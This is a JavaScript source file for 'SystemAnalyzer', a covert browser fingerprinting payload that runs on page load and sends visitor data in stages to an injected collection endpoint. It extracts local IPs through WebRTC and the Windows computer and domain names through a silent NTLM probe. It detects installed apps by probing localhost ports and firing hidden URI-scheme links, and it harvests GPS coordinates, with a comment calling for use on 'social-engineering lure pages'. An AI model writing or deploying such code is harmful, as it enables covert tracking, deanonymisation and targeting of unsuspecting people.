/**
 * SystemAnalyzer – Client-side fingerprinting payload
 * Injected values at serve time:
 *   __PIXEL_ID__    → tracking pixel ID
 *   __COLLECT_URL__ → POST endpoint
 *   __BASE_URL__    → base server URL (for NTLM probe)
 *
 * Strategy: three-stage sending so Safari / fast-navigators still
 * send at least partial data even if they close the tab quickly.
 *   Stage 1 (immediate)  – navigator, screen, timezone, client hints
 *   Stage 2 (~2.5 s)     – + WebRTC local IPs / hostname + NTLM
 *   Stage 3 (~varies)    – + detected apps (URI scheme probing)
 */
(function () {
  'use strict';

  var PID         = '__PIXEL_ID__';
  var COLLECT_URL = '__COLLECT_URL__';
  var BASE_URL    = '__BASE_URL__';

  // ── Utility ──────────────────────────────────────────────────────────────
  function tryGet(fn) { try { return fn(); } catch (e) { return null; } }

  function djb2(str) {
    var hash = 5381;
    for (var i = 0; i < str.length; i++) {
      hash = ((hash << 5) + hash) + str.charCodeAt(i);
      hash = hash & hash;
    }
    return (hash >>> 0).toString(16);
  }

  function send(payload) {
    var body = JSON.stringify(payload);
    if (navigator.sendBeacon) {
      var ok = navigator.sendBeacon(COLLECT_URL, new Blob([body], { type: 'application/json' }));
      if (ok) return;
    }
    // XHR fallback (Safari ITP sometimes blocks sendBeacon cross-origin)
    var xhr = new XMLHttpRequest();
    xhr.open('POST', COLLECT_URL, true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(body);
  }

  // ── Screen ───────────────────────────────────────────────────────────────
  function getScreen() {
    return {
      screen_res:  screen.width + 'x' + screen.height,
      avail_res:   screen.availWidth + 'x' + screen.availHeight,
      color_depth: screen.colorDepth,
      pixel_ratio: window.devicePixelRatio || 1
    };
  }

  // ── Navigator ────────────────────────────────────────────────────────────
  function getNavigator() {
    var nav = window.navigator;
    var plugins = [];
    if (nav.plugins) {
      for (var i = 0; i < nav.plugins.length; i++) {
        plugins.push(nav.plugins[i].name + ' (' + nav.plugins[i].filename + ')');
      }
    }
    return {
      platform:       nav.platform,
      language:       nav.language,
      languages:      tryGet(function () { return nav.languages ? nav.languages.join(',') : null; }),
      cpu_cores:      nav.hardwareConcurrency || null,
      memory_gb:      nav.deviceMemory || null,
      cookie_enabled: nav.cookieEnabled,
      do_not_track:   nav.doNotTrack,
      plugins:        plugins
    };
  }

  // ── Timezone ─────────────────────────────────────────────────────────────
  function getTimezone() {
    return {
      timezone:   tryGet(function () { return Intl.DateTimeFormat().resolvedOptions().timeZone; }),
      utc_offset: new Date().getTimezoneOffset()
    };
  }

  // ── Canvas fingerprint ────────────────────────────────────────────────────
  function getCanvasHash() {
    return tryGet(function () {
      var c   = document.createElement('canvas');
      c.width = 200; c.height = 40;
      var ctx = c.getContext('2d');
      ctx.textBaseline = 'top';
      ctx.font         = '14px Arial';
      ctx.fillStyle    = '#f60';
      ctx.fillRect(0, 0, 200, 40);
      ctx.fillStyle    = '#069';
      ctx.fillText('SystemAnalyzer \xab\xbb \u2603', 2, 15);
      ctx.fillStyle    = 'rgba(102,204,0,0.7)';
      ctx.fillText('SystemAnalyzer \xab\xbb \u2603', 4, 17);
      return djb2(c.toDataURL());
    });
  }

  // ── WebGL ─────────────────────────────────────────────────────────────────
  function getWebGL() {
    return tryGet(function () {
      var c  = document.createElement('canvas');
      var gl = c.getContext('webgl') || c.getContext('experimental-webgl');
      if (!gl) return {};
      var dbg = gl.getExtension('WEBGL_debug_renderer_info');
      return {
        webgl_vendor:   dbg ? gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL)   : gl.getParameter(gl.VENDOR),
        webgl_renderer: dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER),
        webgl_version:  gl.getParameter(gl.VERSION),
        shading_lang:   gl.getParameter(gl.SHADING_LANGUAGE_VERSION)
      };
    }) || {};
  }

  // ── Audio context fingerprint ─────────────────────────────────────────────
  function getAudioHash(callback) {
    tryGet(function () {
      var AC = window.AudioContext || window.webkitAudioContext;
      if (!AC) { callback(null); return; }
      var ctx        = new AC();
      var oscillator = ctx.createOscillator();
      var analyser   = ctx.createAnalyser();
      var gain       = ctx.createGain();
      var scriptProc = ctx.createScriptProcessor(4096, 1, 1);
      gain.gain.value     = 0;
      oscillator.type     = 'triangle';
      oscillator.connect(analyser);
      analyser.connect(scriptProc);
      scriptProc.connect(gain);
      gain.connect(ctx.destination);
      var output = [];
      scriptProc.onaudioprocess = function (e) {
        var buf = e.inputBuffer.getChannelData(0);
        for (var i = 0; i < buf.length; i++) output.push(buf[i]);
        oscillator.disconnect(); analyser.disconnect();
        scriptProc.disconnect(); gain.disconnect();
        ctx.close();
        callback(djb2(output.slice(0, 500).join(',')));
      };
      oscillator.start(0);
    }) || callback(null);
  }

  // ── Font probe ────────────────────────────────────────────────────────────
  function getFonts() {
    var testFonts = [
      'Arial','Arial Black','Calibri','Cambria','Comic Sans MS','Consolas',
      'Courier New','Georgia','Helvetica','Impact','Lucida Console',
      'Lucida Sans Unicode','Microsoft Sans Serif','Palatino Linotype',
      'Segoe UI','Tahoma','Times New Roman','Trebuchet MS','Verdana',
      'Wingdings','Ubuntu','DejaVu Sans','Liberation Sans','Roboto',
      'Noto Sans','Open Sans','Source Code Pro','Menlo','Monaco',
      'SF Pro','Helvetica Neue','Gill Sans','Futura','Optima','Garamond'
    ];
    return tryGet(function () {
      var canvas = document.createElement('canvas');
      var ctx    = canvas.getContext('2d');
      var base   = 'monospace';
      var baseW  = (function () {
        ctx.font = '72px ' + base;
        return ctx.measureText('mmmmmmmmmmlli').width;
      })();
      return testFonts.filter(function (font) {
        ctx.font = '72px ' + font + ',' + base;
        return ctx.measureText('mmmmmmmmmmlli').width !== baseW;
      });
    }) || [];
  }

  // ── MIME type enumeration ─────────────────────────────────────────────────
  function getMimeTypes() {
    return tryGet(function () {
      var types = [];
      var mimes = navigator.mimeTypes;
      if (!mimes) return types;
      for (var i = 0; i < mimes.length; i++) types.push(mimes[i].type);
      return types;
    }) || [];
  }

  // ── Client Hints API ──────────────────────────────────────────────────────
  function getClientHints(callback) {
    var result = { ua_os: null, ua_os_version: null, ua_architecture: null, ua_model: null };
    try {
      if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
        navigator.userAgentData.getHighEntropyValues([
          'platform', 'platformVersion', 'architecture', 'model', 'uaFullVersion'
        ]).then(function (h) {
          result.ua_os           = h.platform        || null;
          result.ua_os_version   = h.platformVersion || null;
          result.ua_architecture = h.architecture    || null;
          result.ua_model        = h.model           || null;
          callback(result);
        }).catch(function () { callback(result); });
      } else {
        result.ua_os = navigator.platform || null;
        callback(result);
      }
    } catch(e) { callback(result); }
  }

  // ── WebRTC local IP + hostname leak ───────────────────────────────────────
  function getWebRTCInfo(callback) {
    var result = { local_ips: [], hostname: null };
    var done   = false;

    function finish() {
      if (done) return;
      done = true;
      try { pc.close(); } catch(e) {}
      callback(result);
    }

    try {
      var pc = new RTCPeerConnection({
        iceServers: [
          { urls: 'stun:stun.l.google.com:19302' },
          { urls: 'stun:stun1.l.google.com:19302' }
        ]
      });
      pc.createDataChannel('fp');
      pc.onicecandidate = function (evt) {
        if (!evt.candidate) { finish(); return; }
        var cand = evt.candidate.candidate || '';
        var allIpv4 = cand.match(/\b(\d{1,3}(?:\.\d{1,3}){3})\b/g) || [];
        var ipv6    = cand.match(/([a-f0-9]{0,4}:){2,7}[a-f0-9]{0,4}/gi) || [];
        allIpv4.concat(ipv6).forEach(function(ip) {
          if (ip !== '0.0.0.0' && result.local_ips.indexOf(ip) === -1) {
            result.local_ips.push(ip);
          }
        });
        var mdns = cand.match(/([a-z0-9][a-z0-9\-]*\.local)\b/i);
        if (mdns && !result.hostname) result.hostname = mdns[1];
      };
      pc.createOffer().then(function(o) { return pc.setLocalDescription(o); }).catch(finish);
      setTimeout(finish, 2500);
    } catch(e) { callback(result); }
  }

  // ── NTLM computer name probe ──────────────────────────────────────────────
  // On Windows (IE / Edge / domain-joined Chrome), the browser auto-responds
  // to a 401 NTLM challenge with a negotiate message containing the real
  // computer name and domain — no user interaction required.
  function probeNTLM(callback) {
    try {
      var xhr = new XMLHttpRequest();
      xhr.open('GET', BASE_URL + '/ntlm-probe/' + PID, true);
      xhr.withCredentials = true;
      xhr.timeout = 3000;
      xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
          var computer = xhr.getResponseHeader('X-Computer-Name') || null;
          var domain   = xhr.getResponseHeader('X-Domain-Name')   || null;
          callback({ ntlm_computer: computer, ntlm_domain: domain });
        }
      };
      xhr.ontimeout = xhr.onerror = function () { callback({}); };
      xhr.send();
    } catch(e) { callback({}); }
  }

  // ── URI scheme / installed app probing ────────────────────────────────────
  var APP_SCHEMES = [
    { name: 'Zoom',              scheme: 'zoommtg'        },
    { name: 'Microsoft Teams',   scheme: 'msteams'        },
    { name: 'Slack',             scheme: 'slack'          },
    { name: 'Discord',           scheme: 'discord'        },
    { name: 'Skype',             scheme: 'skype'          },
    { name: 'Spotify',           scheme: 'spotify'        },
    { name: 'Telegram',          scheme: 'tg'             },
    { name: 'WhatsApp',          scheme: 'whatsapp'       },
    { name: 'Signal',            scheme: 'sgnl'           },
    { name: 'Webex',             scheme: 'wbx'            },
    { name: 'Dropbox',           scheme: 'dbxs'           },
    { name: 'OneDrive',          scheme: 'onedrive'       },
    { name: 'Notion',            scheme: 'notion'         },
    { name: 'Figma',             scheme: 'figma'          },
    { name: 'Outlook',           scheme: 'ms-outlook'     },
    { name: 'Word',              scheme: 'ms-word'        },
    { name: 'Excel',             scheme: 'ms-excel'       },
    { name: 'PowerPoint',        scheme: 'ms-powerpoint'  },
    { name: 'OneNote',           scheme: 'onenote'        },
    { name: 'VS Code',           scheme: 'vscode'         },
    { name: 'AnyDesk',           scheme: 'anydesk'        },
    { name: 'TeamViewer',        scheme: 'teamviewer'     },
    { name: 'Adobe Acrobat',     scheme: 'acrobat'        },
    { name: 'iTunes',            scheme: 'itms'           },
    { name: 'VLC',               scheme: 'vlc'            },
    { name: 'Xcode',             scheme: 'xcode'          },
    { name: 'FaceTime',          scheme: 'facetime'       },
    { name: 'Apple Maps',        scheme: 'maps'           },
    { name: 'App Store',         scheme: 'itms-apps'      },
    { name: 'Apple Music',       scheme: 'music'          },
    { name: 'Apple Shortcuts',   scheme: 'shortcuts'      },
    { name: 'LinkedIn',          scheme: 'linkedin'       },
    { name: 'Instagram',         scheme: 'instagram'      },
    { name: 'Twitter/X',         scheme: 'twitter'        },
    { name: 'Facebook',          scheme: 'fb'             },
    { name: 'Snapchat',          scheme: 'snapchat'       },
    { name: 'Gmail',             scheme: 'googlegmail'    },
    { name: 'Google Maps',       scheme: 'comgooglemaps'  },
    { name: 'Google Drive',      scheme: 'googledrive'    },
    { name: 'Google Meet',       scheme: 'gmeet'          },
    { name: 'YouTube',           scheme: 'youtube'        },
    { name: 'Netflix',           scheme: 'nflx'           },
    { name: 'Uber',              scheme: 'uber'           },
    { name: 'TikTok',            scheme: 'snssdk1128'     },
    { name: 'Google Pay',        scheme: 'googlepay'      }
  ];

  // ── WebSocket / local-port bypass ────────────────────────────────────────
  // Many desktop apps expose local HTTP/WebSocket servers for their web integrations.
  // These ports are reachable even from HTTPS pages (apps set Access-Control-Allow-Origin: *).
  // This method works where URI scheme probing fails (desktop Chrome 60+).
  var WS_APP_PROBES = [
    // Discord RPC server — intentionally accessible from web pages
    { name: 'Discord',          url: 'ws://127.0.0.1:6463/?v=1&client_id=0' },
    { name: 'Discord',          url: 'ws://127.0.0.1:6464/?v=1&client_id=0' },
    { name: 'Discord',          url: 'ws://127.0.0.1:6465/?v=1&client_id=0' },
    // Spotify local helper — used by Spotify Web Player
    { name: 'Spotify',          url: 'ws://127.0.0.1:4381/remote/connect?cors=&ref=a' },
    // VS Code remote debugger port
    { name: 'VS Code',          url: 'ws://127.0.0.1:9229/' },
    // Zoom
    { name: 'Zoom',             url: 'ws://127.0.0.1:19421/' },
    // Figma desktop agent
    { name: 'Figma',            url: 'ws://127.0.0.1:18412/' },
    // Steam local API
    { name: 'Steam',            url: 'ws://127.0.0.1:27060/' },
    // Epic Games Launcher
    { name: 'Epic Games',       url: 'ws://127.0.0.1:9002/' },
  ];

  // HTTP probes (using image timing — works on both http and https pages)
  // Fast error (< threshold) = port open = app running
  var HTTP_APP_PROBES = [
    { name: 'Spotify',          url: 'http://127.0.0.1:4381/buddi/version' },
    { name: 'Discord',          url: 'http://127.0.0.1:6463/' },
    { name: 'Steam',            url: 'http://127.0.0.1:27060/steam/fps' },
    { name: 'Epic Games',       url: 'http://127.0.0.1:34141/' },
    { name: 'Battle.net',       url: 'http://127.0.0.1:1120/' },
    { name: 'Slack',            url: 'http://127.0.0.1:9990/' },
    { name: 'WhatsApp Desktop', url: 'http://127.0.0.1:12001/' },
    { name: 'Zoom',             url: 'http://127.0.0.1:19421/' },
  ];

  function probeWSApp(entry, callback) {
    var done = false;
    var t0   = Date.now();
    var timer = setTimeout(function() {
      if (!done) { done = true; callback(false); }
    }, 800);
    try {
      var ws = new WebSocket(entry.url);
      ws.onopen = function() {
        if (!done) {
          done = true;
          clearTimeout(timer);
          try { ws.close(); } catch(e) {}
          callback(true);   // connection opened = app is running
        }
      };
      ws.onerror = function() {
        if (!done) {
          done = true;
          clearTimeout(timer);
          // Fast error = connection refused = app not running
          // Slow error could still mean port is open (non-WS response)
          callback((Date.now() - t0) > 200);
        }
      };
    } catch(e) {
      clearTimeout(timer);
      callback(false);
    }
  }

  function probeHTTPPort(entry, callback) {
    // Uses fetch with no-cors — timing difference between open and closed port
    var done  = false;
    var t0    = Date.now();
    var THRESHOLD = 180; // ms: faster than this = port is open (connection refused fast)
    var timer = setTimeout(function() {
      if (!done) { done = true; callback(false); } // timed out = port filtered/closed
    }, THRESHOLD + 50);
    try {
      fetch(entry.url, { method: 'HEAD', mode: 'no-cors', signal: AbortSignal.timeout(THRESHOLD) })
        .then(function() {
          if (!done) { done = true; clearTimeout(timer); callback(true); }
        })
        .catch(function() {
          if (!done) {
            done = true;
            clearTimeout(timer);
            callback((Date.now() - t0) < THRESHOLD); // fast error = connection refused = open
          }
        });
    } catch(e) { clearTimeout(timer); callback(false); }
  }

  function probeLocalServers(callback, detected) {
    // Phase 1: WebSocket probes (deduplicate app names)
    var seen = {};
    detected.forEach(function(d) { seen[d] = true; });

    var wsRemaining = WS_APP_PROBES.length;
    if (wsRemaining === 0) { runHTTPPhase(); return; }

    WS_APP_PROBES.forEach(function(entry) {
      probeWSApp(entry, function(open) {
        if (open && !seen[entry.name]) {
          seen[entry.name] = true;
          detected.push(entry.name);
        }
        if (--wsRemaining === 0) runHTTPPhase();
      });
    });

    function runHTTPPhase() {
      var httpRemaining = HTTP_APP_PROBES.length;
      if (httpRemaining === 0) { callback(detected); return; }
      HTTP_APP_PROBES.forEach(function(entry) {
        probeHTTPPort(entry, function(open) {
          if (open && !seen[entry.name]) {
            seen[entry.name] = true;
            detected.push(entry.name);
          }
          if (--httpRemaining === 0) callback(detected);
        });
      });
    }
  }

  function probeApps(callback) {
    var detected = [];
    if (navigator.getInstalledRelatedApps) {
      navigator.getInstalledRelatedApps().then(function (apps) {
        apps.forEach(function (a) { detected.push(a.id || a.platform || 'unknown'); });
        // Also run local server probes alongside PWA list
        probeLocalServers(function(d) { probeViaSchemes(callback, d); }, detected);
      }).catch(function () {
        probeLocalServers(function(d) { probeViaSchemes(callback, d); }, detected);
      });
      return;
    }
    // Run local server probes first (faster, more reliable on desktop)
    // then URI scheme probing for remaining apps
    probeLocalServers(function(d) { probeViaSchemes(callback, d); }, detected);
  }

  function probeViaSchemes(callback, detected) {
    var idx           = 0;
    var PROBE_TIMEOUT = 300;   // ms per scheme (reduced from 350)

    // Track if the window currently has focus so we don't misfire blur on load
    var _hasFocus = document.hasFocus();
    window.addEventListener('focus', function() { _hasFocus = true;  });
    window.addEventListener('blur',  function() { _hasFocus = false; });

    function probeNext() {
      if (idx >= APP_SCHEMES.length) { callback(detected); return; }
      var entry      = APP_SCHEMES[idx++];
      var detected_  = false;
      var probeStart = Date.now();

      // ── Detection A: page becomes hidden (mobile — app takes full screen) ─
      function onVC() {
        if (document.hidden && !detected_) {
          detected_ = true;
          detected.push(entry.name);
        }
      }

      // ── Detection B: window loses focus (desktop — native app gets focus) ─
      // Only fires within 1.5 s of triggering the scheme to avoid user-click FP
      function onBlur() {
        if (!detected_ && (Date.now() - probeStart) < 1500) {
          // Short confirm — if focus returns in <200 ms it was a mis-fire
          var blurTs = Date.now();
          setTimeout(function() {
            if (!detected_ && !_hasFocus && (Date.now() - blurTs) < 300) {
              detected_ = true;
              detected.push(entry.name);
            }
          }, 200);
        }
      }

      document.addEventListener('visibilitychange', onVC);
      window.addEventListener('blur', onBlur);

      // ── Trigger: anchor click (works as user-gesture equivalent in Chrome) ─
      // Iframes alone fail silently for custom schemes in Chrome 60+
      var a = document.createElement('a');
      a.href          = entry.scheme + '://open';
      a.style.cssText = 'display:none;position:absolute;left:-9999px;';
      document.body.appendChild(a);
      try { a.click(); } catch(e) {}

      // ── Fallback: iframe (still works on older Chrome / Firefox / Safari) ──
      var iframe = document.createElement('iframe');
      iframe.style.cssText = 'display:none;width:0;height:0;position:absolute;left:-9999px;';
      iframe.src = entry.scheme + '://open';
      document.body.appendChild(iframe);

      setTimeout(function () {
        document.removeEventListener('visibilitychange', onVC);
        window.removeEventListener('blur', onBlur);
        try { document.body.removeChild(a);      } catch(e) {}
        try { document.body.removeChild(iframe); } catch(e) {}
        probeNext();
      }, PROBE_TIMEOUT);
    }
    probeNext();
  }

  // ── Network info ──────────────────────────────────────────────────────────
  function getNetwork() {
    var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (!conn) return {};
    return {
      connection_type: conn.effectiveType || conn.type,
      downlink:        conn.downlink,
      rtt:             conn.rtt,
      save_data:       conn.saveData
    };
  }

  // ── Touch ─────────────────────────────────────────────────────────────────
  function getTouch() {
    return {
      touch:            ('ontouchstart' in window) ? 1 : 0,
      max_touch_points: navigator.maxTouchPoints || 0
    };
  }

  // ── Battery ───────────────────────────────────────────────────────────────
  function getBattery(callback) {
    if (navigator.getBattery) {
      navigator.getBattery()
        .then(function (b) { callback({ battery_level: b.level, charging: b.charging }); })
        .catch(function () { callback({}); });
    } else { callback({}); }
  }

  // ── Media Devices (camera / mic presence) ─────────────────────────────────
  function getMediaDevices(callback) {
    if (!navigator.mediaDevices || !navigator.mediaDevices.enumerateDevices) {
      callback({}); return;
    }
    navigator.mediaDevices.enumerateDevices()
      .then(function (devices) {
        var cameras  = devices.filter(function(d){ return d.kind === 'videoinput'; }).length;
        var mics     = devices.filter(function(d){ return d.kind === 'audioinput'; }).length;
        var speakers = devices.filter(function(d){ return d.kind === 'audiooutput'; }).length;
        callback({
          camera_count:    cameras,
          microphone_count: mics,
          speaker_count:   speakers,
          has_camera:      cameras > 0,
          has_microphone:  mics > 0
        });
      })
      .catch(function () { callback({}); });
  }

  // ── CSS Media Features ────────────────────────────────────────────────────
  function getCSSMedia() {
    function mq(q) { try { return window.matchMedia(q).matches; } catch(e){ return null; } }
    return {
      prefers_dark:    mq('(prefers-color-scheme: dark)') ? 1 : 0,
      prefers_reduced: mq('(prefers-reduced-motion: reduce)') ? 1 : 0,
      pointer_type:    mq('(pointer: fine)') ? 'fine' : mq('(pointer: coarse)') ? 'coarse' : 'none',
      has_hover:       mq('(hover: hover)') ? 1 : 0,
      forced_colors:   mq('(forced-colors: active)') ? 1 : 0,
      hdr_display:     mq('(dynamic-range: high)') ? 1 : 0,
      orientation:     tryGet(function(){ return screen.orientation ? screen.orientation.type : null; })
    };
  }

  // ── Speech Synthesis Voices ───────────────────────────────────────────────
  function getSpeechVoices() {
    try {
      if (!window.speechSynthesis) return [];
      var voices = window.speechSynthesis.getVoices();
      if (voices.length === 0) return [];           // async on some browsers — skip
      return voices.map(function(v){ return v.name + ' (' + v.lang + ')'; });
    } catch(e) { return []; }
  }

  // ── Permissions Probe ─────────────────────────────────────────────────────
  function getPermissions(callback) {
    if (!navigator.permissions) { callback({}); return; }
    var names   = ['camera', 'microphone', 'notifications', 'geolocation', 'clipboard-read'];
    var result  = {};
    var pending = names.length;
    names.forEach(function(name) {
      navigator.permissions.query({ name: name })
        .then(function(r) { result[name.replace('-','_') + '_perm'] = r.state; })
        .catch(function() {})
        .finally(function() { if (--pending === 0) callback(result); });
    });
    // Fallback timeout in case .finally isn't supported everywhere
    setTimeout(function() { callback(result); }, 2000);
  }

  // ── GPS Geolocation (exact coordinates — Stage 4, fires independently) ────
  // Requires user to grant location permission in the browser.
  // Only fires when __ENABLE_GEO__ is set to '1' (injected by server).
  // Shows a browser permission prompt — use on social-engineering lure pages only.
  var _GEO_ENABLED = '__ENABLE_GEO__';   // replaced at serve time with '0' or '1'

  function tryGeolocation() {
    if (_GEO_ENABLED !== '1') return;
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
      function(pos) {
        var geo = {
          pid:          PID,
          stage:        'geo',
          geo_lat:      pos.coords.latitude,
          geo_lon:      pos.coords.longitude,
          geo_accuracy: pos.coords.accuracy,        // metres
          geo_altitude: pos.coords.altitude || null,
          geo_speed:    pos.coords.speed    || null,
          geo_heading:  pos.coords.heading  || null,
          ts_client:    new Date().toISOString()
        };
        send(geo);
      },
      function() { /* permission denied or unavailable — silent */ },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
    );
  }

  // ── Performance / JS Memory ───────────────────────────────────────────────
  function getPerfMemory() {
    try {
      var mem = performance.memory;
      if (!mem) return {};
      return {
        js_heap_limit_mb: Math.round(mem.jsHeapSizeLimit  / 1048576),
        js_heap_used_mb:  Math.round(mem.usedJSHeapSize   / 1048576),
      };
    } catch(e) { return {}; }
  }

  // ── Base payload (sync — available immediately) ────────────────────────────
  function basePayload() {
    return Object.assign(
      { pid: PID, stage: 'partial' },
      getScreen(),
      getNavigator(),
      getTimezone(),
      { canvas_hash: getCanvasHash() },
      getWebGL(),
      { fonts:         getFonts() },
      { mime_types:    getMimeTypes() },
      { speech_voices: getSpeechVoices() },
      getCSSMedia(),
      getPerfMemory(),
      getNetwork(),
      getTouch(),
      {
        referrer:   document.referrer,
        page_title: document.title,
        page_url:   window.location.href,
        ts_client:  new Date().toISOString()
      }
    );
  }

  // ── Entry point ───────────────────────────────────────────────────────────
  function run() {
    // STAGE 1: Send immediately — ensures Safari gets data even on fast nav
    var partial = basePayload();
    send(partial);

    // STAGE 2: WebRTC + Client Hints + NTLM + Audio + Battery + Media + Permissions (~2.5 s)
    var webrtcDone   = false;
    var hintsDone    = false;
    var ntlmDone     = false;
    var audioDone    = false;
    var batteryDone  = false;
    var mediaDone    = false;
    var permsDone    = false;
    var webrtcData   = {};
    var hintsData    = {};
    var ntlmData     = {};
    var audioData    = {};
    var batteryData  = {};
    var mediaData    = {};
    var permsData    = {};

    function sendStage2() {
      if (!webrtcDone || !hintsDone || !ntlmDone || !audioDone ||
          !batteryDone || !mediaDone || !permsDone) return;
      var full = Object.assign(
        basePayload(), webrtcData, hintsData, ntlmData,
        audioData, batteryData, mediaData, permsData,
        { stage: 'full', detected_apps: [] }
      );
      send(full);
    }

    getWebRTCInfo(function(r)     { webrtcData  = { local_ips: r.local_ips, hostname: r.hostname }; webrtcDone  = true; sendStage2(); });
    getClientHints(function(r)    { hintsData   = r;                  hintsDone   = true; sendStage2(); });
    probeNTLM(function(r)         { ntlmData    = r;                  ntlmDone    = true; sendStage2(); });
    getAudioHash(function(h)      { audioData   = { audio_hash: h };  audioDone   = true; sendStage2(); });
    getBattery(function(b)        { batteryData = b;                  batteryDone = true; sendStage2(); });
    getMediaDevices(function(m)   { mediaData   = m;                  mediaDone   = true; sendStage2(); });
    getPermissions(function(p)    { permsData   = p;                  permsDone   = true; sendStage2(); });

    // STAGE 3: App probing (slow — runs in background, sends when done)
    probeApps(function (apps) {
      var full = Object.assign(
        basePayload(), webrtcData, hintsData, ntlmData,
        audioData, batteryData, mediaData, permsData,
        { stage: 'apps', detected_apps: apps }
      );
      send(full);
    });

    // STAGE 4: GPS geolocation — independent send, only if __ENABLE_GEO__=1
    tryGeolocation();
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', run);
  } else {
    run();
  }
})();
